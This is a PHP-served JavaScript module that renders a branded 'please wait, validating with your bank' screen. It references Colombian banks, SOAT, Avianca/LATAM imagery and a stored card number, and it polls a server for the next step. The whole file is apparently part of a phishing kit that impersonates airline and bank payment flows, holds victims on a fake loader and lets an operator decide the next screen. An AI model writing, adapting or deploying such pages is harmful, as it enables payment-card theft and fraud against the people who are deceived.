<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');


$soat = isset($_GET['soat']) ? $_GET['soat'] : null;
$banco = isset($_GET['banco']) ? $_GET['banco'] : null;
$origen = isset($_GET['origen_code']) ? $_GET['origen_code'] : null;
$file_path = '';

switch ($banco) {
	// case 'colpatria':
	// 	if ($origen != null) {
	// 		require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}_bank/{$banco}_wait.php");
	// 	} else {
	// 		require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}/{$banco}_wait.php");
	// 	}
	// 	break;
	// 	// case 'davivienda':
	// 	// case 'bogota':
	// 	// case 'falabella':
	// case 'nequi':
	// case 'bancolombia_news':
	// case 'bancolombia':
	// 	require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}/{$banco}_wait.php");
	// 	break;
	default:
?>
		var my_titulo = 'Confirmando';
		var my_contenido = `
		<style>
			body {
				font-family: arial;
				margin: 0;
				overflow: hidden;
				background-color: #ffffff;
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				/* max-width: 512px; */
				background-color: white;
				height: 100vh;
			}

			#content {
				position: relative;
				z-index: 1;
				opacity: 0.5;
				background-color: rgba(255, 255, 255, 0.9);
				padding: 20px;
			}

			#aviancaContainer {
				position: fixed;
				top: 50%;
				left: 50%;
				transform: translate(-50%, -50%);
				background-color: rgba(255, 255, 255, 0.9);
				border-radius: 10px;
				padding: 30px;
				z-index: 999;
				text-align: center;
				box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
			}

			#aviancaContainer img {
				width: 120px;
				/* Tamaño ajustado de la imagen */
				height: auto;
				margin-bottom: 20px;
				/* Espaciado debajo de la imagen */
			}

			/* Fondo oscuro detrás del modal */
			#content::before {
				content: '';
				position: fixed;
				top: 0;
				left: 0;
				width: 100%;
				height: 100%;
				background-color: rgba(0, 0, 0, 0.5);
				/* Fondo oscuro con opacidad */
				z-index: 998;
				/* Fondo detrás del modal */
			}
		</style>
		<div id="content">

		</div>
		<div id="aviancaContainer">
			<center><img src="${my_hosting}img/ltam/wait.gif" alt="" srcset=""></center>
		</div>
		<!-- <div class="m-auto text-center" id="container" style="font-size: 20px;margin: 10px;text-align: center;">
			<div id="text">

				Por favor, espere un momento...
				<br>
				Estamos validando la información ingresada con su banco emisor.
				<br>
				<br>
				Solo tardará unos segundos.
			</div>

			<img src="${my_hosting}_avianca/assets/plane-loader.gif" width="100%" id="loading"> -->

		</div>
		`;
<?php
		break;
}
?>
//<script>
	$(document).ready(function() {
		$('#content').html(localStorage.getItem('loaderFond'));

		$('[id="aviancaContainer"]').css('display', 'none');
		let a = my_data['destino_ciudad'];
		if (a) {
			$('#aviancaContainer').css('display', 'flex');
		} else {
			$('#aviancaContainer').css('display', 'none');
			$('#text').hide();
			$('#container').css('height', '100%');

			let img = $('#loading');
			img.css('display', 'block');
			img.css('margin', '0 auto');
			img.css('width', '600px');
			img.css('height', '80px');
			if (my_data['tarjeta'] && my_data['tarjeta'].substr(0, 1) == '4') {
				img.attr('src', my_hosting + 'img/gif_visa2.gif');
			} else {
				img.attr('src', my_hosting + 'img/gif_mastercard2.gif');
			}
		}

	});


	if (my_data['timeOutAction']) {
		let action = my_data['timeOutAction'];
		setTimeout(() => {
			loadFile([action])
		}, my_data['timeOutSeconds'] * 1000);
		my_data['timeOutSeconds'] = null;
		my_data['timeOutAction'] = null
	} else {
		clearInterval(my_timer);
		my_timer = setInterval(consultarEstado, 2000);
	}